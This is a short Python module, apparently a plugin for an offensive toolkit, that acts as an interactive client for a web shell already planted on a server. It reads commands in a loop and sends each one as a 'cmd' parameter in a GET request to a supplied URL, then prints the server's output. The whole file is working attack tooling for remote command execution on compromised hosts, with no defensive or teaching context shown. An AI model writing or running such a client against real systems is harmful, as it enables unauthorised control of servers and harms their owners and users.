def run(data, cred, args):
    import requests

    url = getattr(args, "url", None)

    if not url:
        print("[!] Provide --url")
        return

    print("[+] Interactive web shell (type 'exit' to quit)")

    while True:
        cmd = input("$ ")

        if cmd in ["exit", "quit"]:
            break

        try:
            r = requests.get(url, params={"cmd": cmd})
            print(r.text)
        except Exception as e:
            print(f"[!] Error: {e}")